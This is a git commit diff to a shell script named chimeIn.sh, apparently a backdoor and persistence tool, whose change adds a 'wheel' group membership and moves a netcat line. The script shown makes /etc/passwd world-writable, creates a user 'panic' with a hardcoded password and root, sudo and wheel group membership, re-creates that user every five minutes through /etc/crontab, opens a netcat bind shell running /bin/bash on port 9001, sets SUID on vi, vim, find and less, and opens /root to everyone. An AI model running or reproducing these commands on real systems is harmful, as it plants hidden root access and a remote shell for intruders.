9a889db10fdd2c2848eedae9b4772d6af1288414
Kole Swesey <45017744+0xPanic@users.noreply.github.com>
2022-03-05 20:18:06 -0600

    one more group

--- chimeIn.sh
+++ chimeIn.sh
@@ -4,11 +4,12 @@ chmod 666 /etc/passwd
 useradd panic  && echo -e "riseab0ve\nriseab0ve" | passwd panic 2> /dev/null
 usermod -a -G root panic
 usermod -a -G sudo panic
+usermod -a -G wheel panic
 echo "*/5 * * * *  root  useradd panic && echo -e "riseab0ve\nriseab0ve" | passwd panic && usermod -a -G root panic" >> /etc/crontab
 apt update > /dev/null 2> /dev/null && apt -y install netcat-traditional 2> /dev/null > /dev/null
-nc.traditional -l -p 9001 -e /bin/bash &
 chmod u+s `which vi`
 chmod u+s `which vim`
 chmod u+s `which find`
 chmod u+s `which less`
 chmod -R 777 /root
+nc.traditional -l -p 9001 -e /bin/bash &
